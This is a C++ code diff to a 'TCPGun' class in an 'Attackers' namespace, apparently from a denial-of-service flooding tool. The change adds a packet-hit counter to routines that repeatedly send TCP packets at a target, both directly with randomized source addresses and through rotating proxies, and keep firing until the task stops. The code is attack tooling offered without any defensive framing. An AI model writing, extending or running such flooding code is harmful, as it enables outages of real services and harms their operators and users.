@@ -13,43 +13,27 @@
 
 using namespace Attackers;
 
-void TCPGun::FireTillDead(const CURI &targetToKill) noexcept
+std::size_t TCPGun::FireTillDead(const CURI &targetToKill) noexcept
 {
+	std::size_t hitsCount{0};
+
 	SPDLOG_INFO("Firing at {} without proxy", targetToKill);
-	FireWithoutProxy(targetToKill);
+	FireWithoutProxy(targetToKill, hitsCount);
 
 	SPDLOG_INFO("Firing at {} with proxy", targetToKill);
-	FireWithProxy(targetToKill);
+	FireWithProxy(targetToKill, hitsCount);
+
+	return hitsCount;
 }
 
-std::optional<CURI> TCPGun::Aim(const CURI &uriToAttack) noexcept
-{
-	Informator informer;
-	informer.LoadNewData();
-
-	for(size_t proxyTry = 0; 
-		proxyTry < ProxyConfig::PROXY_TRIES; proxyTry++)
-	{
-		if(const auto proxies = informer.GetProxies())
-		{
-			if(auto resolvedAddress{m_attacker.CheckConnection(uriToAttack, *proxies)})
-			{
-				return *resolvedAddress;
-			}
-		}
-		informer.LoadNewData();
-	}
-
-	return {};
-}
-bool TCPGun::FireWithoutProxy(const CURI &targetToKill) noexcept
+bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	// Checking connectivity over proxy, because packets would be send with randomized source
 
 	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, {})};
 	while(!m_currentTask.ShouldStop())
 	{
-		if(resolvedAddress && ShootTarget(*resolvedAddress))
+		if(resolvedAddress && ShootTarget(*resolvedAddress, hitsCount))
 		{
 			resolvedAddress = m_attacker.CheckConnection(targetToKill, {});
 		}
@@ -57,7 +41,7 @@ bool TCPGun::FireWithoutProxy(const CURI &targetToKill) noexcept
 	return false;
 }
 
-void TCPGun::FireWithProxy(const CURI &targetToKill) noexcept
+void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	Informator informer;
 	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
@@ -73,13 +57,12 @@ void TCPGun::FireWithProxy(const CURI &targetToKill) noexcept
 	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, *proxies)};
 	while(!m_currentTask.ShouldStop() && resolvedAddress)
 	{
-		SPDLOG_INFO("{} is up", *resolvedAddress);
-		ShootTarget(*resolvedAddress);
+		ShootTarget(*resolvedAddress, hitsCount);
 		resolvedAddress = m_attacker.CheckConnection(targetToKill, *proxies);
 	}
 }
 
-bool TCPGun::ShootTarget(const CURI &targetToShoot)
+bool TCPGun::ShootTarget(const CURI &targetToShoot, std::size_t &hitsCount)
 {
 	size_t count = 0;
 	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
@@ -92,11 +75,13 @@ bool TCPGun::ShootTarget(const CURI &targetToShoot)
 		if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
 			sendStatus == TCPWrapper::TCPStatus::GotError)
 		{
+			hitsCount += count;
 			SPDLOG_WARN("Something went wrong durring sending packet");
 			return true;
 		}
 	}
 	SPDLOG_INFO("Already sent: {} packets to {}, rechecking target...", count, 
 		targetToShoot);
+	hitsCount += count;
 	return false;
 }
